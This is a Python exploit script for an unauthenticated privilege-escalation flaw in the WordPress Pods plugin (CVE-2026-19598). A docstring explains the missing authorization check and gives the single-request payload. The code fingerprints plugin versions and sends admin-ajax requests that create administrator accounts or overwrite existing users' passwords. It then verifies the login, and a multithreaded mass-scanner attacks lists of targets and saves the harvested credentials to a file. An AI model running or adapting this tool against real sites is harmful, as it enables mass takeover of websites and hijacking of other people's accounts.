#!/usr/bin/env python3
"""
CVE-2026-19598 — Pods – Custom Content Types and Fields (WordPress)
Unauthenticated Privilege Escalation → Administrator (Site Takeover)

CVSS 3.1: 9.8 CRITICAL | CWE-862 Missing Authorization
Affected: Pods <= 3.3.9 (fixed in 3.3.9.1)
Published: 2026-08-15 | Discovered by: Wordfence (Vuln ID 3628032a-...)

ROOT CAUSE
  PodsAdmin::admin_ajax() funnels every access check (method allowlist,
  nonce, login, capability) through pods_error(). In the JSON meta-box-loader
  compatibility path (meta-box-loader=1 + JSON request), pods_error() only
  writes to error_log and returns false instead of terminating. The router
  never checks the return value, so all guards are no-ops and ANY PodsAPI
  method becomes callable unauthenticated — including save_user() which
  wraps wp_insert_user()/wp_update_user().

ATTACK (1 request, no account, no nonce):
  POST /wp-admin/admin-ajax.php
  Header: Accept: application/json
  Body:   action=pods_admin&method=save_user&meta-box-loader=1
          &user_login=<u>&user_pass=<p>&user_email=<e>&role=administrator

  → creates an Administrator user. Or overwrite any user's password:
      ...&ID=<target_id>&user_pass=<newpass>

VERIFIED in lab (WP 6.x + Pods 3.3.9):
  create admin  -> HTTP 200 "2", wp_capabilities = {administrator:1}
  overwrite pw  -> HTTP 200 "1", user_pass hash changed

USAGE:
  python cve_2026_19598.py -t target.com
  python cve_2026_19598.py -t target.com --user x --pass y --email z@a.b
  python cve_2026_19598.py -t target.com --overwrite 1 --newpass NewPass123!
  python cve_2026_19598.py -f targets.txt --threads 20 -o pwned.txt

AUTHOR: shinthink
"""
import argparse
import os
import random
import re
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 12
MAX_THREADS = 20
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]
SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
SPIN_FRAME = 0

BANNER_FALLBACK = """
  ____   ___  ____  ____
 |  _ \\ / _ \\|  _ \\/ ___|
 | |_) | | | | | | \\___ \\
 |  __/| |_| | |_| |___) |
 |_|    \\___/|____/|____/

  Pods WordPress Plugin | CVE-2026-19598 | PrivEsc -> Admin
"""


def rid(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


def rua():
    return random.choice(UA_LIST)


def get_banner():
    try:
        r = requests.get("https://asciified.thelicato.io/api/v2/ascii",
                         params={"text": "PODS", "font": "Standard"}, timeout=6)
        if r.status_code == 200 and r.text.strip():
            return r.text.rstrip("\n") + "\n\n  Pods WordPress Plugin | CVE-2026-19598 | CVSS 9.8"
    except Exception:
        pass
    return BANNER_FALLBACK


BANNER = get_banner()


class _Spin:
    def __init__(self, msg="Scanning..."):
        self.msg = msg
        self.running = True
        self.t = threading.Thread(target=self._loop, daemon=True)
        self.t.start()

    def _loop(self):
        global SPIN_FRAME
        while self.running:
            SPIN_FRAME += 1
            s = SPIN[SPIN_FRAME % len(SPIN)]
            sys.stdout.write(f"\r  {s} {self.msg}")
            sys.stdout.flush()
            time.sleep(0.08)

    def ok(self):
        self.running = False
        sys.stdout.write(f"\r  ✓ {self.msg}\n")
        sys.stdout.flush()

    def fail(self):
        self.running = False
        sys.stdout.write(f"\r  ✗ {self.msg}\n")
        sys.stdout.flush()


@dataclass
class Result:
    host: str = ""
    detected: bool = False
    version: Optional[str] = None
    vulnerable: bool = False
    exploited: bool = False
    user_id: Optional[str] = None
    user_login: Optional[str] = None
    user_pass: Optional[str] = None
    vector: Optional[str] = None
    error: Optional[str] = None
    status: str = ""
    elapsed: float = 0.0


class PodsExploit:
    def __init__(self, verbose=False, debug=False, timeout=TIMEOUT):
        self.verbose = verbose
        self.debug = debug
        self.timeout = timeout

    def _sess(self):
        s = requests.Session()
        s.headers.update({"User-Agent": rua(), "Accept": "*/*"})
        s.verify = False
        return s

    def _log(self, host, msg):
        if self.debug:
            print(f"  [*] {host} {msg}", flush=True)

    # ── Detection ──
    def detect(self, host):
        """Returns (installed, version)."""
        s = self._sess()
        for proto in ("https://", "http://"):
            base = f"{proto}{host}"
            try:
                r = s.get(base + "/wp-content/plugins/pods/readme.txt", timeout=8,
                          allow_redirects=False)
                if r.status_code == 200 and "Pods" in r.text:
                    m = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
                    v = m.group(1) if m else None
                    # also check changelog / version in init.php
                    return True, v
            except Exception:
                pass
            try:
                r = s.get(base + "/wp-content/plugins/pods/init.php", timeout=8,
                          allow_redirects=False)
                if r.status_code == 200:
                    m = re.search(r"Version:\s*([0-9.]+)", r.text)
                    return True, m.group(1) if m else None
            except Exception:
                pass
        return False, None

    @staticmethod
    def is_vulnerable(version):
        if not version:
            return True  # present but unknown version -> assume vulnerable
        try:
            from packaging.version import Version
            return Version(version) <= Version("3.3.9")
        except Exception:
            # fallback: compare numerically
            def key(v):
                return [int(x) for x in re.findall(r"\d+", v)]
            return key(version) <= key("3.3.9") and version != "3.3.9.1"

    # ── Exploit ──
    def create_admin(self, host, user, passwd, email):
        s = self._sess()
        for proto in ("https://", "http://"):
            base = f"{proto}{host}"
            try:
                r = s.post(
                    base + "/wp-admin/admin-ajax.php",
                    headers={"Accept": "application/json"},
                    data={
                        "action": "pods_admin",
                        "method": "save_user",
                        "meta-box-loader": "1",
                        "user_login": user,
                        "user_pass": passwd,
                        "user_email": email,
                        "role": "administrator",
                    },
                    timeout=self.timeout, allow_redirects=False,
                )
                self._log(host, f"create_admin HTTP {r.status_code} body={r.text[:60]!r}")
                m = re.fullmatch(r"\s*(\d+)\s*", r.text)
                if r.status_code == 200 and m and int(m.group(1)) > 0:
                    return m.group(1)
            except Exception as e:
                self._log(host, f"create_admin err: {str(e)[:40]}")
        return None

    def overwrite_password(self, host, user_id, newpass):
        s = self._sess()
        for proto in ("https://", "http://"):
            base = f"{proto}{host}"
            try:
                r = s.post(
                    base + "/wp-admin/admin-ajax.php",
                    headers={"Accept": "application/json"},
                    data={
                        "action": "pods_admin",
                        "method": "save_user",
                        "meta-box-loader": "1",
                        "ID": user_id,
                        "user_pass": newpass,
                    },
                    timeout=self.timeout, allow_redirects=False,
                )
                self._log(host, f"overwrite HTTP {r.status_code} body={r.text[:60]!r}")
                m = re.fullmatch(r"\s*(\d+)\s*", r.text)
                if r.status_code == 200 and m and int(m.group(1)) > 0:
                    return m.group(1)
            except Exception as e:
                self._log(host, f"overwrite err: {str(e)[:40]}")
        return None

    def verify_login(self, host, user, passwd):
        """Best-effort: confirm the new user can log in to wp-login.php."""
        s = self._sess()
        for proto in ("https://", "http://"):
            base = f"{proto}{host}"
            try:
                r = s.post(base + "/wp-login.php",
                           data={"log": user, "pwd": passwd,
                                 "wp-submit": "Log In", "redirect_to": base + "/wp-admin/",
                                 "testcookie": "1"},
                           timeout=self.timeout, allow_redirects=False)
                if r.status_code in (302, 301) and "wp-admin" in r.headers.get("Location", ""):
                    return True
                if r.status_code == 200 and "Dashboard" in r.text:
                    return True
            except Exception:
                pass
        return None

    # ── Run ──
    def run(self, host, user=None, passwd=None, email=None, overwrite=None, newpass=None):
        t0 = time.time()
        host = host.strip().rstrip("/")
        host = re.sub(r"^https?://", "", host)
        r = Result(host=host)

        installed, version = self.detect(host)
        if not installed:
            r.status = "not_found"
            r.elapsed = time.time() - t0
            return r
        r.detected = True
        r.version = version
        r.vulnerable = self.is_vulnerable(version)
        if not r.vulnerable:
            r.status = "patched"
            r.error = f"version {version} >= 3.3.9.1 (patched)"
            r.elapsed = time.time() - t0
            return r

        user = user or f"wp_{rid(6)}"
        passwd = passwd or f"{rid(8)}!Aa1"
        email = email or f"{user}@{rid(6)}.com"

        if overwrite:
            uid = self.overwrite_password(host, overwrite, newpass or passwd)
            if uid:
                r.exploited = True
                r.user_id = uid
                r.user_login = overwrite
                r.user_pass = newpass or passwd
                r.vector = f"save_user overwrite ID={overwrite}"
                r.status = "pwned"
            else:
                r.status = "failed"
                r.error = "overwrite failed (patched >= 3.3.9.1 or WAF)"
        else:
            uid = self.create_admin(host, user, passwd, email)
            if uid:
                r.exploited = True
                r.user_id = uid
                r.user_login = user
                r.user_pass = passwd
                r.vector = "save_user create_admin role=administrator"
                r.status = "pwned"
                # best-effort login verification
                if self.verify_login(host, user, passwd):
                    r.status = "pwned+login"
            else:
                r.status = "failed"
                r.error = "create_admin failed (patched >= 3.3.9.1 or WAF)"

        r.elapsed = time.time() - t0
        return r


class MassScanner:
    def __init__(self, targets, threads=MAX_THREADS, output=None, user=None,
                 passwd=None, email=None, verbose=False, debug=False, timeout=TIMEOUT):
        self.targets = targets
        self.threads = threads
        self.output = output
        self.user = user
        self.passwd = passwd
        self.email = email
        self.verbose = verbose
        self.debug = debug
        self.timeout = timeout
        self.results = []
        self._lock = threading.Lock()
        self._n = 0
        self._T = len(targets)

    def run(self):
        print(BANNER)
        print(f"  Targets: {self._T}  |  Threads: {self.threads}")
        print()
        if self.output:
            open(self.output, "w").close()
        t0 = time.time()
        self._start_spin()
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                fs = {ex.submit(self._one, t): t for t in self.targets}
                for f in as_completed(fs):
                    try:
                        r = f.result()
                    except Exception as e:
                        r = Result(host=str(f), status="error", error=str(e))
                    self.results.append(r)
                    self._print_result(r)
        finally:
            self._stop_spin()
        self._summary(time.time() - t0)
        return self.results

    def _start_spin(self):
        self._spinning = True
        self._spin_t = threading.Thread(target=self._spin_loop, daemon=True)
        self._spin_t.start()

    def _spin_loop(self):
        while getattr(self, '_spinning', False):
            s = SPIN[SPIN_FRAME % len(SPIN)]
            sys.stdout.write(f"\r\033[K  {s} Scanning... 0/{self._T} (0%)  Det:0  Pwn:0")
            sys.stdout.flush()
            time.sleep(0.08)

    def _stop_spin(self):
        self._spinning = False

    def _one(self, t):
        t = t.strip().rstrip("/")
        t = re.sub(r"^https?://", "", t)
        if not re.match(r"^[\w.-]+:\d+$", t):
            t = t.split(":")[0]
        return PodsExploit(verbose=self.verbose, debug=self.debug,
                           timeout=self.timeout).run(t, user=self.user,
                                                     passwd=self.passwd, email=self.email)

    def _print_result(self, r):
        with self._lock:
            self._stop_spin()
            self._n += 1
            n = self._n
            det = sum(1 for x in self.results if x.detected)
            pwn = sum(1 for x in self.results if x.exploited)
            pct = n * 100 // self._T if self._T else 0
            filled = int(15 * n / self._T) if self._T else 0
            bar = "█" * filled + "░" * (15 - filled)
            s = SPIN[SPIN_FRAME % len(SPIN)]
            if r.exploited:
                sys.stdout.write(f"\0337\n\033[K  \033[32m[PWNED]\033[0m {r.host:35s} {r.user_login} / {r.user_pass}\n\0338")
                sys.stdout.flush()
                if self.output:
                    with open(self.output, "a") as f:
                        f.write(f"{r.host} | {r.user_login} | {r.user_pass} | id={r.user_id} | {r.vector}\n")
            host = r.host[:35]
            tag = "PWN" if r.exploited else ("VULN" if r.vulnerable else ("!" if r.detected else "."))
            sys.stdout.write(f"\r\033[K  [{tag}] {host:35s} | {s} [{bar}] {n}/{self._T} ({pct}%)  Det:{det}  Pwn:{pwn}")
            sys.stdout.flush()

    def _summary(self, elapsed):
        sys.stdout.write(f"\r\033[K\n")
        t = len(self.results)
        det = sum(1 for r in self.results if r.detected)
        vuln = sum(1 for r in self.results if r.vulnerable)
        pwn = sum(1 for r in self.results if r.exploited)
        print(f"\n  {'─' * 55}")
        print(f"  Done | {elapsed:.0f}s | Targets:{t} | Detected:{det} | Vulnerable:{vuln} | Pwned:{pwn}")
        if self.output:
            print(f"  Pwned creds     : {self.output}")
        print(f"  {'─' * 55}\n")


def main():
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    p = argparse.ArgumentParser(
        description="CVE-2026-19598 — Pods Unauthenticated Privilege Escalation",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python cve_2026_19598.py -t target.com
  python cve_2026_19598.py -t target.com --user pwn --pass Pwn123! --email p@x.com
  python cve_2026_19598.py -t target.com --overwrite 1 --newpass NewPass123!
  python cve_2026_19598.py -f targets.txt --threads 20 -o pwned.txt""")
    p.add_argument("-t", "--target")
    p.add_argument("-f", "--file")
    p.add_argument("-o", "--output", help="Save pwned creds")
    p.add_argument("--user", help="Admin username to create (default: random)")
    p.add_argument("--pass", dest="passwd", help="Admin password (default: random)")
    p.add_argument("--email", help="Admin email (default: random)")
    p.add_argument("--overwrite", help="Overwrite password of an existing user ID")
    p.add_argument("--newpass", help="New password for --overwrite")
    p.add_argument("--threads", type=int, default=MAX_THREADS)
    p.add_argument("--no-cleanup", action="store_true")
    p.add_argument("--debug", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    a = p.parse_args()

    targets = []
    if a.target:
        targets.append(a.target)
    if a.file:
        if not os.path.isfile(a.file):
            print(f"[!] {a.file}")
            sys.exit(1)
        with open(a.file) as f:
            targets.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))
    if not targets:
        p.print_help()
        sys.exit(1)
    targets = list(dict.fromkeys(targets))

    if len(targets) == 1:
        print(BANNER)
        sp = _Spin("Scanning...")
        pe = PodsExploit(verbose=True, debug=a.debug)
        r = pe.run(targets[0], user=a.user, passwd=a.passwd, email=a.email,
                   overwrite=a.overwrite, newpass=a.newpass)
        sp.ok() if r.detected else sp.fail()
        Y, N = '\033[32m', '\033[0m'
        print(f"\n  Host       : {r.host}")
        print(f"  Pods       : {Y}YES{N}{' v' + r.version if r.version else ''}" if r.detected else "  Pods       : NO")
        print(f"  Vulnerable : {Y}YES{N}" if r.vulnerable else "  Vulnerable : NO")
        print(f"  Vector     : {r.vector or '-'}")
        print(f"  Exploited  : {Y}YES{N}" if r.exploited else "  Exploited  : NO")
        if r.exploited:
            print(f"  User ID    : {r.user_id}")
            print(f"  Creds      : {r.user_login} / {r.user_pass}")
        if r.error:
            print(f"  Note       : {r.error}")
        print(f"  Time       : {r.elapsed:.1f}s\n")
        return

    MassScanner(targets, threads=a.threads, output=a.output, user=a.user,
                passwd=a.passwd, email=a.email, verbose=a.verbose, debug=a.debug).run()


if __name__ == "__main__":
    main()
